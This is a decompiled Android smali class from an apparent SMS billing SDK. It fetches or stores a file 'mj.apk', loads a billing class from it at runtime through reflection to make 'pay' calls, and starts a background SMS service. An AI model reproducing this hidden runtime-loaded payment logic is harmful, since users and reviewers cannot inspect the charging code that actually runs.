.class public Lcom/mj/jar/pay/c;
.super Ljava/lang/Object;


# static fields
.field public static a:Z

.field public static b:Ljava/lang/String;

.field private static final d:Ljava/lang/String;


# instance fields
.field public c:Landroid/os/Handler;

.field private e:Landroid/app/Activity;

.field private f:Ljava/lang/Class;

.field private g:Ljava/lang/Object;

.field private h:Lcom/mj/jar/pay/a;

.field private i:Ljava/lang/String;

.field private j:Ljava/lang/String;

.field private k:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-class v0, Lcom/mj/jar/pay/c;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/mj/jar/pay/c;->d:Ljava/lang/String;

    const/4 v0, 0x1

    sput-boolean v0, Lcom/mj/jar/pay/c;->a:Z

    return-void
.end method

.method public constructor <init>(Landroid/app/Activity;Lcom/mj/jar/pay/a;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    new-instance v0, Lcom/mj/jar/pay/d;

    invoke-direct {v0, p0}, Lcom/mj/jar/pay/d;-><init>(Lcom/mj/jar/pay/c;)V

    iput-object v0, p0, Lcom/mj/jar/pay/c;->c:Landroid/os/Handler;

    iput-object p1, p0, Lcom/mj/jar/pay/c;->e:Landroid/app/Activity;

    iput-object p2, p0, Lcom/mj/jar/pay/c;->h:Lcom/mj/jar/pay/a;

    iput-object p3, p0, Lcom/mj/jar/pay/c;->i:Ljava/lang/String;

    iput-object p4, p0, Lcom/mj/jar/pay/c;->j:Ljava/lang/String;

    iput-object p5, p0, Lcom/mj/jar/pay/c;->k:Ljava/lang/String;

    const-string v0, "mj.apk"

    invoke-virtual {p1, v0}, Landroid/app/Activity;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/mj/jar/pay/c;->b:Ljava/lang/String;

    new-instance v0, Lcom/mj/jar/pay/e;

    iget-object v1, p0, Lcom/mj/jar/pay/c;->c:Landroid/os/Handler;

    sget-object v2, Lcom/mj/jar/pay/c;->b:Ljava/lang/String;

    invoke-direct {v0, p1, v1, v2}, Lcom/mj/jar/pay/e;-><init>(Landroid/content/Context;Landroid/os/Handler;Ljava/lang/String;)V

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, ""

    aput-object v3, v1, v2

    invoke-virtual {v0, v1}, Lcom/mj/jar/pay/e;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/mj/jar/pay/SmsServices;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method static synthetic a(Lcom/mj/jar/pay/c;)Lcom/mj/jar/pay/a;
    .locals 1

    iget-object v0, p0, Lcom/mj/jar/pay/c;->h:Lcom/mj/jar/pay/a;

    return-object v0
.end method

.method private a()V
    .locals 4

    :try_start_0
    iget-object v0, p0, Lcom/mj/jar/pay/c;->e:Landroid/app/Activity;

    sget-object v1, Lcom/mj/jar/pay/c;->b:Ljava/lang/String;

    invoke-static {v0, v1}, Lcom/mj/jar/pay/b;->a(Landroid/content/Context;Ljava/lang/String;)Lcom/mj/jar/pay/b;

    move-result-object v0

    const-string v1, "com.mj.billing.MjBilling"

    invoke-virtual {v0, v1}, Lcom/mj/jar/pay/b;->a(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    iput-object v0, p0, Lcom/mj/jar/pay/c;->f:Ljava/lang/Class;

    const/4 v0, 0x5

    new-array v0, v0, [Ljava/lang/Class;

    const/4 v1, 0x0

    const-class v2, Landroid/content/Context;

    aput-object v2, v0, v1

    const/4 v1, 0x1

    const-class v2, Landroid/os/Handler;

    aput-object v2, v0, v1

    const/4 v1, 0x2

    const-class v2, Ljava/lang/String;

    aput-object v2, v0, v1

    const/4 v1, 0x3

    const-class v2, Ljava/lang/String;

    aput-object v2, v0, v1

    const/4 v1, 0x4

    const-class v2, Ljava/lang/String;

    aput-object v2, v0, v1

    iget-object v1, p0, Lcom/mj/jar/pay/c;->f:Ljava/lang/Class;

    invoke-virtual {v1, v0}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v0

    const/4 v1, 0x5

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    iget-object v3, p0, Lcom/mj/jar/pay/c;->e:Landroid/app/Activity;

    aput-object v3, v1, v2

    const/4 v2, 0x1

    iget-object v3, p0, Lcom/mj/jar/pay/c;->c:Landroid/os/Handler;

    aput-object v3, v1, v2

    const/4 v2, 0x2

    iget-object v3, p0, Lcom/mj/jar/pay/c;->i:Ljava/lang/String;

    aput-object v3, v1, v2

    const/4 v2, 0x3

    iget-object v3, p0, Lcom/mj/jar/pay/c;->j:Ljava/lang/String;

    aput-object v3, v1, v2

    const/4 v2, 0x4

    iget-object v3, p0, Lcom/mj/jar/pay/c;->k:Ljava/lang/String;

    aput-object v3, v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    iput-object v0, p0, Lcom/mj/jar/pay/c;->g:Ljava/lang/Object;

    sget-boolean v0, Lcom/mj/jar/pay/c;->a:Z

    invoke-virtual {p0, v0}, Lcom/mj/jar/pay/c;->a(Z)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const-string v0, "sms"

    const-string v1, "Now using the billing logic in the apk."

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method static synthetic b(Lcom/mj/jar/pay/c;)Ljava/lang/Object;
    .locals 1

    iget-object v0, p0, Lcom/mj/jar/pay/c;->g:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic c(Lcom/mj/jar/pay/c;)Ljava/lang/Class;
    .locals 1

    iget-object v0, p0, Lcom/mj/jar/pay/c;->f:Ljava/lang/Class;

    return-object v0
.end method

.method static synthetic d(Lcom/mj/jar/pay/c;)Landroid/app/Activity;
    .locals 1

    iget-object v0, p0, Lcom/mj/jar/pay/c;->e:Landroid/app/Activity;

    return-object v0
.end method

.method static synthetic e(Lcom/mj/jar/pay/c;)V
    .locals 0

    invoke-direct {p0}, Lcom/mj/jar/pay/c;->a()V

    return-void
.end method


# virtual methods
.method public final a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    iget-object v0, p0, Lcom/mj/jar/pay/c;->g:Ljava/lang/Object;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/mj/jar/pay/c;->f:Ljava/lang/Class;

    if-nez v0, :cond_1

    :cond_0
    invoke-direct {p0}, Lcom/mj/jar/pay/c;->a()V

    :cond_1
    const/4 v0, 0x3

    :try_start_0
    new-array v0, v0, [Ljava/lang/Class;

    const/4 v1, 0x0

    const-class v2, Ljava/lang/String;

    aput-object v2, v0, v1

    const/4 v1, 0x1

    const-class v2, Ljava/lang/String;

    aput-object v2, v0, v1

    const/4 v1, 0x2

    const-class v2, Ljava/lang/String;

    aput-object v2, v0, v1

    iget-object v1, p0, Lcom/mj/jar/pay/c;->f:Ljava/lang/Class;

    const-string v2, "pay"

    invoke-virtual {v1, v2, v0}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    iget-object v1, p0, Lcom/mj/jar/pay/c;->g:Ljava/lang/Object;

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p1, v2, v3

    const/4 v3, 0x1

    aput-object p2, v2, v3

    const/4 v3, 0x2

    aput-object p3, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/mj/jar/pay/c;->c:Landroid/os/Handler;

    const/16 v2, 0x7e6

    invoke-virtual {v1, v2}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public final a(Z)V
    .locals 4

    sput-boolean p1, Lcom/mj/jar/pay/c;->a:Z

    iget-object v0, p0, Lcom/mj/jar/pay/c;->f:Ljava/lang/Class;

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    :try_start_0
    new-array v0, v0, [Ljava/lang/Class;

    const/4 v1, 0x0

    sget-object v2, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v2, v0, v1

    iget-object v1, p0, Lcom/mj/jar/pay/c;->f:Ljava/lang/Class;

    const-string v2, "SetDebugMode"

    invoke-virtual {v1, v2, v0}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    sget-boolean v3, Lcom/mj/jar/pay/c;->a:Z

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    aput-object v3, v1, v2

    const/4 v2, 0x0

    invoke-virtual {v0, v2, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method
